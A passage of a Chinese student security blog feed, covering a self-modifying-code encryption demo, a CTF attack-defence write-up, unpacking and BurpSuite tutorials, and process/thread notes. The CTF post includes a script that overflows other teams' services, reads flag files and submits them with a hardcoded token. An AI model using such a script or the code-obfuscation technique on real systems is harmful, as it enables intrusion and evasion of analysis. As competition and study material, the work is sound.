class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/SECTION:.text,ERWS"</span>)</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">enc</span><span class="params">(<span class="keyword">char</span> *start,<span class="keyword">int</span> len)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++) <span class="comment">//这里对地址进行简单的加密&gt;</span></div><div class="line">&#123;</div><div class="line">*(start+i) ^=<span class="number">0x88</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//需要保护的函数</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ck</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"this is a test of smc"</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment">//加密数据结束的地址</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">end</span><span class="params">()</span></span>&#123;&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">char</span> *lp_s = <span class="number">0</span>;</div><div class="line"><span class="keyword">char</span> *lp_e = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">lp_s = (<span class="keyword">char</span> *)ck;  <span class="comment">//获取需要加密函数的起始地址</span></div><div class="line">lp_e = (<span class="keyword">char</span> *)end;  <span class="comment">//获取需要加密函数的结束地址</span></div><div class="line">len=lp_e-lp_s;</div><div class="line">enc(lp_s,len);      <span class="comment">//smc加密函数</span></div><div class="line">ck();</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>现在，现在可以编译通过,生成test，但是无法运行，因为ck()函数的地址已经被打乱啦，这时候就利用OD进行修改，载入生成的程序，当程序运行enc()函数完成时，这时ck就已经完成加密啦，然后将程序dump下来test1。这时就可以运行啦。若拿<br>test去静态看时，完全看不懂ck的代码(这就进行smc加密啦)。</p><h2 id="解密SMC"><a href="#解密SMC" class="headerlink" title="解密SMC"></a>解密SMC</h2><p>1、找到smc的加密函数，当运行完成smc解密函数时,将程序dump下来。<br>2、smc对程序动态完全没有用，可以用OD来调试程序，找到受保护代码</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在main函数前，还有什么&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>第四届MIAC线下总结</title>
    <link href="http://yoursite.com/2018/05/09/wp_2017_12_24_miac_xianxia/"/>
    <id>http://yoursite.com/2018/05/09/wp_2017_12_24_miac_xianxia/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:42:53.796Z</updated>
    
    <content type="html"><![CDATA[<p>虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习<br><a id="more"></a></p><h2 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h2><p>这是MIAC在决赛，这时不得不提初赛，第一个初赛直接被各种大佬打爆平台，导致所有队伍全部被改名字，主办方只好取消。后面两次虽然成功，但是结果仍然让我们出乎意料(一般都是前20进入决赛，这是前80，难以想象[这里后面证明是正确的])。</p><h2 id="2、比赛"><a href="#2、比赛" class="headerlink" title="2、比赛"></a>2、比赛</h2><p>比赛前一晚：看了比赛规则，发现有一台靶机和一台攻击机机（这是啥）,一小时一轮，一个三轮（后面怀疑主办方的说明，居然一个小时一个题目[一个5小轮]）。于是开始准备各种工具，自动提交flag脚本，通防工具，提取脚本，木马（后来都输给了主板方）。<br>比赛前:80个队伍，做得位置全部不知道（蒙）。终于进场了，都是找了好久，终于找到位置。发现我们只能用攻击机工具别人的靶机（类似实验吧）。<br>第一轮:葛师傅和潘师傅找到web题目，我在找pwn题目（最后，，，一个小时过去了，找不到题目，发现根本没有pwn题目），葛师傅很气愤，因为题目不能下下来。而且，自己电脑和靶机电脑是网络隔离的。不能用ssh连接。<br>第二轮:潘师傅和葛师傅找到mysql的弱密码，然后开始写文件进去，读文件出来，但是不知道为什么不能读到flag,而我只能在那里维护，看看那些ip来连接了我们，然后去杀掉pid.<br>第三轮:mysql的弱密码，这里可以读取flag了。可是这里主办方的flag不能及时刷新，导致我们提交的flag不对，这里问技术人员，他说赛后在谈论。</p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>1、首先这个比赛没有pwn题，那bin师傅只能看看屏幕了。<br>2、对比赛规则要仔细研究<br>3、liunx下的命令要熟悉</p><p>总结:<br>1、一上去可以连接上去，先备份一下所有的镜像文件。<br>2、修改自己的靶机（服务器）的密码，mysql的密码<br>3、看看有哪些题目<br>4、先挂上通防，等主办方来警告就撤下来</p><h2 id="4、脚本"><a href="#4、脚本" class="headerlink" title="4、脚本"></a>4、脚本</h2><p>这里pwn题自动提交flag脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line">context(arch = <span class="string">'amd64'</span>)</div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">start = time.time()</div><div class="line"><span class="comment">#p = process('./pwn')</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">28</span>):</div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="comment">#if i == 25:</span></div><div class="line"><span class="comment">#continue</span></div><div class="line">p = remote(<span class="string">'172.16.%s.102'</span> % i,<span class="number">20002</span>)</div><div class="line">p.recv()</div><div class="line">payload=<span class="string">"a"</span>*<span class="number">213</span></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">timestart = time.time()</div><div class="line">p.sendline(<span class="string">'cat /home/newcalc/flag'</span>)</div><div class="line">a = p.recvline(timeout=<span class="number">5</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"============="</span> </div><div class="line"><span class="keyword">print</span> a[<span class="number">2</span>:]</div><div class="line">url_platform = <span class="string">'http://172.16.200.3:9000/submit_flag/'</span></div><div class="line">token = <span class="string">'L4FBjK6K3nhkTcFMcwDGuWOwqR9GYbghNbtmOc49wjRiKS60SoILVjFgMpj3Etcx7R0wMIrB1os'</span></div><div class="line">post_data = &#123;</div><div class="line"><span class="string">'token'</span>:token,</div><div class="line"><span class="string">'flag'</span>:a[<span class="number">2</span>:]</div><div class="line">&#125;</div><div class="line">r = requests.post(url_platform, data = post_data)</div><div class="line">timenow = time.time()-timestart</div><div class="line"><span class="keyword">if</span>(timenow == <span class="number">5</span>):</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="comment">#p.interactive()</span></div><div class="line"><span class="keyword">except</span>:</div><div class="line"><span class="keyword">pass</span></div><div class="line">end = time.time()</div><div class="line">time.sleep(<span class="number">300</span> - (end -start))</div></pre></td></tr></table></figure></p><p>这里是liunx命令:<br>备份数据库<br><code>mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql</code><br><code>mysqldump -u root -p 123456 mysql &gt; back.sql</code><br>备份所有数据库<br><code>mysqldump --all-databases &gt; bak.sql</code><br>还原数据库<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql   </div><div class="line">find / *.php -perm        </div><div class="line">awk -F:  /etc/passwd     </div><div class="line">crontab -l</div></pre></td></tr></table></figure></p><p>查看那些端口开放<br><code>netstat -pantu</code><br><img src="" alt=""><br><code>ps -anu</code><br><img src="" alt=""><br>杀死PID<br><code>kill 9511</code><br>查看tcp连接的数量<br><code>netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn</code><br>找到某个文件<br><code>find / -name 文件名</code><br>解压<br><code>tar -xvf file.tar</code><br><code>unzip file.zip</code><br><code>unrar e file.rar</code><br>连接ssh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh root@192.168.1.14</div><div class="line">yes</div><div class="line">password</div><div class="line">ifconfig</div></pre></td></tr></table></figure></p><p>登录mysql数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql -u root -h -p123456</div><div class="line">ifconfig</div></pre></td></tr></table></figure></p><p>将/var/www/html目录下的文件设置为不允许任何人修改<br><code>chattr -R +i /var/www/html</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习&lt;br&gt;
    
    </summary>
    
      <category term="wp" scheme="http://yoursite.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>RE_常见的脱壳方法</title>
    <link href="http://yoursite.com/2018/05/09/re_tou_ke/"/>
    <id>http://yoursite.com/2018/05/09/re_tou_ke/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:42:25.736Z</updated>
    
    <content type="html"><![CDATA[<p>软件壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳和加密壳(强壳)两种，压缩壳只是为了减小程序体积对资源进行压缩，加密壳是程序输入表等等进行加密保护。<br><a id="more"></a></p><h1 id="壳的工作原理"><a href="#壳的工作原理" class="headerlink" title="壳的工作原理"></a>壳的工作原理</h1><p>某些加壳程序加壳后会修改了原来导入目录表的位置为壳的导入表，这样默认的导入表指向壳部分的导入表，你就看不到原来的导入表的内容了。程序启动后，操作系统为壳的导入表加载，在壳代码运行完成之后，壳代码会跳到原程序的入口点OEP，壳模拟操作系统填充原来导入表IAT，这样保证代码段能正常调用函数。一般壳的工作原理也就是这样了，随着现在加壳加密技术的进步，不是所有加壳软件都会这样。</p><h1 id="脱壳原理"><a href="#脱壳原理" class="headerlink" title="脱壳原理"></a>脱壳原理</h1><p>首先修改被加壳程序的入口点到程序原来的OEP，然后修改PE程序导入表目录地址为原来导入表地址，或者新建一个节，将这个新节作为导入表节，并将原导入表内容写入新节导入表。</p><h1 id="普通壳脱壳"><a href="#普通壳脱壳" class="headerlink" title="普通壳脱壳"></a>普通壳脱壳</h1><p>例如：先用peid查一下壳，发现有壳(这里是upx壳)[查壳工具主要以peid和fileinfo这两个软件为代表]<br><img src="https://i.imgur.com/nI3hfj8.png" alt=""><br>接下里分别用下面5种方法脱壳</p><h2 id="1、单步跟踪法"><a href="#1、单步跟踪法" class="headerlink" title="1、单步跟踪法"></a>1、单步跟踪法</h2><p>一般先f8单步步过，遇见向上的f4跳到下一条语句,然后会发现，一般有很大的跳转（大跨段），比如jmp XXXXXX 或者JE XXXXXX或者有RETN的一般很快就会到程序的OEP</p><h2 id="2、ESP定律法"><a href="#2、ESP定律法" class="headerlink" title="2、ESP定律法"></a>2、ESP定律法</h2><p>原理:利用堆栈平衡<br>OD加载，会看见pushad,运行一步，下硬件断点<br><img src="https://i.imgur.com/reV3ht1.png" alt=""><br>运行,就会在硬件断点的位置啦，删除硬件断点，接着往下执行几步就可以看见OEP啦<br><img src="https://i.imgur.com/1zMXa3o.png" alt=""></p><h2 id="3、两次内存镜像法"><a href="#3、两次内存镜像法" class="headerlink" title="3、两次内存镜像法"></a>3、两次内存镜像法</h2><p>如图:<br><img src="https://i.imgur.com/V9QVnMh.png" alt=""><br>点击运行，到达这里<br><img src="https://i.imgur.com/vIx32jU.png" alt=""><br>接着<br><img src="https://i.imgur.com/WTjRmsT.png" alt=""><br>点击运行<br><img src="https://i.imgur.com/zTFsIUo.png" alt=""></p><h2 id="4、一步到达OEP-对少数壳有用"><a href="#4、一步到达OEP-对少数壳有用" class="headerlink" title="4、一步到达OEP(对少数壳有用)"></a>4、一步到达OEP(对少数壳有用)</h2><p>OD加载后，Ctrl+F，搜索popad,接着f4运行到这里，接着一步步往下找就可以找到OEP啦。</p><h2 id="5、模拟跟踪法"><a href="#5、模拟跟踪法" class="headerlink" title="5、模拟跟踪法"></a>5、模拟跟踪法</h2><p>上面都可以属于模拟跟踪法。</p><h2 id="6、SFX"><a href="#6、SFX" class="headerlink" title="6、SFX"></a>6、SFX</h2><p><img src="https://i.imgur.com/0D2h6Eg.png" alt=""><br>重载后，自动跳到程序入口点</p><h2 id="7、修复IAT"><a href="#7、修复IAT" class="headerlink" title="7、修复IAT"></a>7、修复IAT</h2><p>先找到OEP,先用loadPE脱下壳，然后用ImportREC修复IAT,操作如下:<br>loadPE先dump下文件<br><img src="https://i.imgur.com/kRRTIBH.png" alt=""><br>PEID查<br><img src="https://i.imgur.com/zmcHw4T.png" alt=""><br>ImportREC修复IAT(这里我是手动OEP修改的,有些直接自己获取OEP)<br><img src="https://i.imgur.com/o5bCSh0.png" alt=""><br>接着转储文件选择刚才dump下来的文件，点击运行<br><img src="https://i.imgur.com/LQMaBx6.png" alt=""></p><h1 id="vmprotect脱壳"><a href="#vmprotect脱壳" class="headerlink" title="vmprotect脱壳"></a>vmprotect脱壳</h1><p>这里有vc的程序作为示例:<br>正常的vc的程序的入口是的机器码是: 55 8b ec<br>而vmp的壳的程序，是找不到55 8b ec,这里学习记录一下脱壳方法<br>1、用exeinfo PE查壳<br><img src="https://i.imgur.com/vTGY7cr.png" alt=""><br>2、设置OD：选项-&gt;调试设置-&gt;事件-&gt;系统断点<br>3、将程序载入od,f9运行，便会来到一个call，(ctrl+g)搜索，VirtualProtect:<br><img src="https://i.imgur.com/GP0Voer.png" alt=""><br>4、接着便会来到一个地址，在这里下断点，继续f9,<br><img src="https://i.imgur.com/0qeQszn.png" alt=""><br>5、然后运行几次f9都会断到这里，NewProtect = READONLY且最后一次时(运行几次就知道啦，低位不会变)，此时alt+B，断点界面取消或禁用断点，然后alt+M，对text段下内存访问断点：<br><img src="https://i.imgur.com/xU4fNkV.png" alt=""><br>6、来到这里<br><img src="https://i.imgur.com/Qpgt36g.png" alt=""><br>7、(ctrl+g)搜索401000，硬件访问断点。运行，接着可以搜索特征码:EB0B85F375078BC6C1E0100BF0<br>8、这时就会找到OEP啦，可以直接dump出来，IDA可以看见算法啦，如果要运行，还需要IAT修复<br>这里分享一下vmp脱壳教程<br>链接: <a href="http://pan.baidu.com/s/1qWt14lA" target="_blank" rel="external">http://pan.baidu.com/s/1qWt14lA</a> 密码: 2wmq 解压密码：www.lthack.com</p><h2 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h2><p>衣带渐宽终不悔，<br>为伊消得人憔悴。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;软件壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳和加密壳(强壳)两种，压缩壳只是为了减小程序体积对资源进行压缩，加密壳是程序输入表等等进行加密保护。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>BurpSuite从安装到&quot;放弃&quot;</title>
    <link href="http://yoursite.com/2018/05/09/web_bp/"/>
    <id>http://yoursite.com/2018/05/09/web_bp/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:42:42.738Z</updated>
    
    <content type="html"><![CDATA[<p>以前也用过这个工具，不过没有好好的用，很多功能还不是很了解，现在嘛，发现它真的是个神器，好好的学习(其实为了以后找工作，毕竟以后还是会用到这个的呀)，<br><a id="more"></a></p><h1 id="一、BurpSuite是啥"><a href="#一、BurpSuite是啥" class="headerlink" title="一、BurpSuite是啥"></a>一、BurpSuite是啥</h1><p>如果你是打过ctf比赛的，那下面这段直接跳过。它由Java语言编写，是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击。</p><h2 id="常用的功能：抓包、重放、爆破"><a href="#常用的功能：抓包、重放、爆破" class="headerlink" title="常用的功能：抓包、重放、爆破"></a>常用的功能：抓包、重放、爆破</h2><h1 id="二、安装BurpSuite"><a href="#二、安装BurpSuite" class="headerlink" title="二、安装BurpSuite"></a>二、安装BurpSuite</h1><h2 id="1-、首先你的电脑上有java环境，然后下载BurpSuite"><a href="#1-、首先你的电脑上有java环境，然后下载BurpSuite" class="headerlink" title="(1)、首先你的电脑上有java环境，然后下载BurpSuite"></a>(1)、首先你的电脑上有java环境，然后下载BurpSuite</h2><p>在命令控制端输入java,如果是这样，就有java环境，否则自己去安装吧。<br><img src="https://i.imgur.com/qgJuZgp.png" alt=""><br>下载Bp<br>链接：<a href="https://pan.baidu.com/s/10Jq0P5n67VdIZuNZLgj2SQ" target="_blank" rel="external">https://pan.baidu.com/s/10Jq0P5n67VdIZuNZLgj2SQ</a> 密码：rc69</p><h2 id="2-、向浏览器中导入证书"><a href="#2-、向浏览器中导入证书" class="headerlink" title="(2)、向浏览器中导入证书"></a>(2)、向浏览器中导入证书</h2><p>向bp中导入证书<br><img src="https://i.imgur.com/WsAHe0R.png" alt=""><br><img src="https://i.imgur.com/JMqKwA3.png" alt=""><br><img src="https://i.imgur.com/yV1IvtF.png" alt=""><br>向浏览器中导入证书<br><img src="https://i.imgur.com/nwP1HfW.png" alt=""><br><img src="https://i.imgur.com/6z8OAOQ.png" alt=""></p><h2 id="3-、运行，截断流量成功"><a href="#3-、运行，截断流量成功" class="headerlink" title="(3)、运行，截断流量成功"></a>(3)、运行，截断流量成功</h2><p><img src="https://i.imgur.com/TfkzHVJ.png" alt=""><br><img src="https://i.imgur.com/u01CBgq.png" alt=""></p><h1 id="三、功能介绍"><a href="#三、功能介绍" class="headerlink" title="三、功能介绍"></a>三、功能介绍</h1><h2 id="1、Proxy-代理-，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP-消息的结构与内容"><a href="#1、Proxy-代理-，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP-消息的结构与内容" class="headerlink" title="1、Proxy(代理)，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP 消息的结构与内容"></a>1、Proxy(代理)，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP 消息的结构与内容</h2><p>选项Intercept<br><img src="https://i.imgur.com/4MNx4YP.png" alt=""><br>选项option<br><img src="https://i.imgur.com/XfBr0dN.png" alt=""></p><h2 id="2、Intruder-爆破-，定制攻击自动化"><a href="#2、Intruder-爆破-，定制攻击自动化" class="headerlink" title="2、Intruder(爆破)，定制攻击自动化"></a>2、Intruder(爆破)，定制攻击自动化</h2><p>抓包发送到Intruder处<br><img src="https://i.imgur.com/ScC0zjg.png" alt=""><br>工具已经自动为我们创造了有效载荷测试的位置。有效载荷的位置使用§符号作为每个有针对性的攻击位置的起始和结束标记。你想测试的位置前后用§§符号进行标示。然后设置攻击类型<br>Sniper 这种攻击模式可以让我们选择的攻击位置注入一个单一的有效载荷。<br>Pitchfork 这种攻击模式允许你测试多种有效载荷，最大能够自定义8 个，基于攻击位置<br>Cluster bomb 这种攻击模式使用多种有效载荷，并允许你测试每一个可能有效载荷在每个选择的攻击位置，这意味着接下来的测试，交换任何其他有效载荷。当你有不同需要注射的地方，它将会非常的方便。<br><img src="https://i.imgur.com/82tMppA.png" alt=""><br><img src="https://i.imgur.com/1flpjdv.png" alt=""><br><img src="https://i.imgur.com/kdyDg9s.png" alt=""><br><img src="https://i.imgur.com/yicYuFW.png" alt=""><br><img src="https://i.imgur.com/Uhu3Mx3.png" alt=""><br><img src="https://i.imgur.com/pgZUCbH.png" alt=""><br><img src="https://i.imgur.com/ln6ud1a.png" alt=""><br><img src="https://i.imgur.com/3t14eDJ.png" alt=""><br><img src="https://i.imgur.com/4kMNdpE.png" alt=""></p><h2 id="3、Scanner-Web-应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web-应用程序渗透测试。"><a href="#3、Scanner-Web-应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web-应用程序渗透测试。" class="headerlink" title="3、Scanner  Web 应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web 应用程序渗透测试。"></a>3、Scanner  Web 应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web 应用程序渗透测试。</h2><p>参考这个链接:<a href="https://bbs.ichunqiu.com/thread-16260-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-16260-1-1.html</a></p><h2 id="4、Repeater-重放"><a href="#4、Repeater-重放" class="headerlink" title="4、Repeater(重放)"></a>4、Repeater(重放)</h2><p>手工修改，可以不断重放，如下:<br><img src="https://i.imgur.com/4cgA3Z4.png" alt=""></p><h2 id="5、Decoder-解密"><a href="#5、Decoder-解密" class="headerlink" title="5、Decoder(解密)"></a>5、Decoder(解密)</h2><p>用于普通解密，hash<br><img src="https://i.imgur.com/31NPqMZ.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前也用过这个工具，不过没有好好的用，很多功能还不是很了解，现在嘛，发现它真的是个神器，好好的学习(其实为了以后找工作，毕竟以后还是会用到这个的呀)，&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>线程与进程</title>
    <link href="http://yoursite.com/2018/05/09/re_thread_and_process/"/>
    <id>http://yoursite.com/2018/05/09/re_thread_and_process/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:42:13.394Z</updated>
    
    <content type="html"><![CDATA[<p>进程与线程是最常用的方式<br><a id="more"></a></p><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> <span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>创建一个线程的例子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    TCHAR szCommandLine[] = TEXT(<span class="string">"NOTEPAD"</span>);<span class="comment">//或者WCHAR</span></div><div class="line">    <span class="comment">//LPWSTR szCommandLine = TEXT("NOTEPAD");//错误</span></div><div class="line">    <span class="comment">//STARTUPINFO si = &#123; sizeof(si) &#125;;</span></div><div class="line">    STARTUPINFO si;</div><div class="line">    PROCESS_INFORMATION pi;</div><div class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</div><div class="line">    si.cb = <span class="keyword">sizeof</span>(si);</div><div class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</div><div class="line"> </div><div class="line">    si.dwFlags = STARTF_USESHOWWINDOW;  <span class="comment">// 指定wShowWindow成员有效</span></div><div class="line">    si.wShowWindow = TRUE;          <span class="comment">// 此成员设为TRUE的话则显示新建进程的主窗口，</span></div><div class="line">                        <span class="comment">// 为FALSE的话则不显示</span></div><div class="line">    BOOL bRet = ::CreateProcess (</div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 不在此指定可执行文件的文件名</span></div><div class="line">        szCommandLine,      <span class="comment">// 命令行参数</span></div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 默认进程安全性</span></div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 默认线程安全性</span></div><div class="line">        FALSE,          <span class="comment">// 指定当前进程内的句柄不可以被子进程继承</span></div><div class="line">        CREATE_NEW_CONSOLE, <span class="comment">// 为新进程创建一个新的控制台窗口</span></div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 使用本进程的环境变量</span></div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 使用本进程的驱动器和目录</span></div><div class="line">        &amp;si,</div><div class="line">        &amp;pi);</div><div class="line"> </div><div class="line">    <span class="keyword">if</span>(bRet)</div><div class="line">    &#123;</div><div class="line">        WaitForSingleObject(pi.hProcess, INFINITE);</div><div class="line">        <span class="comment">// 既然我们不使用两个句柄，最好是立刻将它们关闭</span></div><div class="line">        ::CloseHandle (pi.hThread);</div><div class="line">        ::CloseHandle (pi.hProcess);</div><div class="line"> </div><div class="line">        <span class="built_in">printf</span>(<span class="string">" 新进程的进程ID号：%d \n"</span>, pi.dwProcessId);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">" 新进程的主线程ID号：%d \n"</span>, pi.dwThreadId);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>fork是linux下创建进程，这里通过pipe来进行进程间的通讯(利用共享内存)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div 